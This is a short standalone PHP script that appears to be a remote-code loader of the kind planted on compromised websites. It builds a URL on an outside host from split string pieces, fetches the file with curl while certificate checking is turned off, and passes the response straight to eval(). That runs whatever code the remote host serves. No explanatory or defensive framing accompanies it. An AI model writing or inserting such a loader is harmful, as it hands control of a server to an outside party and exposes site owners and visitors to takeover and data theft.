<?php
$base = "code.topkz.ru";
$folder = "fgj/1";
$name = "ca5.php";
$fullurl = "https://" . $base . "/" . $folder . "/" . $name;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $fullurl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

// 1
eval("?>" . $result);
?>